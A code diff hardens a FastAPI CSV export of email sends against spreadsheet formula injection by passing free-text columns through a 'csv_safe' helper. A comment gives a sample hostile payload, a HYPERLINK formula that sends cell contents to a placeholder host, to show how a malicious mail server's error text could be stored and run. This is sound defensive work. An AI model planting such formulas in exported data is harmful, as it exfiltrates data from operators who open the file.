@@ -17,6 +17,7 @@ from fastapi.responses import StreamingResponse
 from sqlalchemy import select, update, func
 from sqlalchemy.ext.asyncio import AsyncSession
 
+from app.csv_export import csv_safe
 from app.database import get_db
 from app.dependencies import get_current_user_optional
 from app.models.company import Company
@@ -909,20 +910,28 @@ async def export_email_sends_csv(
         "status", "sent_at", "opened_at", "clicked_at", "ab_variant",
         "scheduled_at", "error",
     ])
+    # ``csv_safe`` on every free-text column. The three that matter are not ones
+    # an operator would recognise as input: ``to_email`` is an address the
+    # scraper harvested off a third-party site, ``subject`` is carried through
+    # from inbound mail on a reply thread, and ``error`` is *whatever the
+    # receiving mail server chose to say* — a hostile MX can answer
+    # ``550 =HYPERLINK("http://x/"&A1,"Click")`` and have it stored verbatim.
+    # None of that fails here; it executes on the operator's machine when they
+    # double-click the download. See ``app.csv_export``.
     for s in sends:
         writer.writerow([
             str(s.id),
             str(s.template_id) if s.template_id else "",
             str(s.contact_id) if s.contact_id else "",
-            s.to_email or "",
-            s.subject or "",
-            s.status,
+            csv_safe(s.to_email),
+            csv_safe(s.subject),
+            csv_safe(s.status),
             s.sent_at.isoformat() if s.sent_at else "",
             s.opened_at.isoformat() if s.opened_at else "",
             s.clicked_at.isoformat() if s.clicked_at else "",
-            s.ab_variant or "",
+            csv_safe(s.ab_variant),
             s.scheduled_at.isoformat() if s.scheduled_at else "",
-            s.error or "",
+            csv_safe(s.error),
         ])
 
     output.seek(0)
